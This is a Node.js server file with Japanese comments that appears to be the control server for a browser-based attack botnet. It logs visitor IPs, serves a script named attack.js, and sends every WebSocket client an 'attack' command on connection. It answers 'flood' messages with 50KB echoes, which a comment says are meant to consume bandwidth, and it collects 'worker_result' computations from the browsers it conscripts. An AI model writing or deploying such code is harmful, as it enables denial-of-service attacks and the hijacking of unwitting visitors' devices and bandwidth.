// server.js
const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');
const path = require('path');

const server = http.createServer((req, res) => {
    // ログ記録
    const ip = req.connection.remoteAddress;
    const log = `[${new Date().toISOString()}] ACCESS: ${ip} | ${req.url}\n`;
    fs.appendFileSync('access.log', log);
    
    // 静的ファイル配信
    if (req.url === '/' || req.url === '/index.html') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(fs.readFileSync('index.html'));
    } else if (req.url === '/attack.js') {
        res.writeHead(200, { 'Content-Type': 'application/javascript' });
        res.end(fs.readFileSync('attack.js'));
    } else {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('OK');
    }
});

const wss = new WebSocket.Server({ server, path: '/ws' });

// 接続中のクライアントを管理
const clients = new Map();

wss.on('connection', (ws, req) => {
    const ip = req.connection.remoteAddress;
    const id = Date.now() + '_' + Math.random();
    
    clients.set(id, {
        ws: ws,
        ip: ip,
        connectedAt: Date.now()
    });
    
    console.log(`[+] クライアント接続: ${ip} (ID: ${id})`);
    
    // 接続情報をログに記録
    const log = `[${new Date().toISOString()}] WS_CONNECT: ${ip}\n`;
    fs.appendFileSync('access.log', log);
    
    // 接続した瞬間に攻撃命令を送信
    ws.send(JSON.stringify({
        command: 'attack',
        intensity: 2
    }));
    
    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);
            
            switch(msg.type) {
                case 'ping':
                    ws.send(JSON.stringify({ type: 'pong', timestamp: Date.now() }));
                    break;
                    
                case 'flood':
                    // 大量データをエコーバック（帯域を消費させる）
                    ws.send(JSON.stringify({
                        type: 'echo',
                        data: 'x'.repeat(1024 * 50), // 50KB
                        timestamp: Date.now()
                    }));
                    break;
                    
                case 'worker_result':
                    // 計算結果を記録
                    const resultLog = `[${new Date().toISOString()}] WORKER_RESULT: ${JSON.stringify(msg.data)}\n`;
                    fs.appendFileSync('results.log', resultLog);
                    break;
            }
        } catch(e) {}
    });
    
    ws.on('close', () => {
        clients.delete(id);
        console.log(`[-] クライアント切断: ${ip}`);
    });
    
    ws.on('error', () => {
        clients.delete(id);
    });
});

const PORT = 3000;
server.listen(PORT, () => {
    console.log(`サーバー起動: http://localhost:${PORT}`);
});
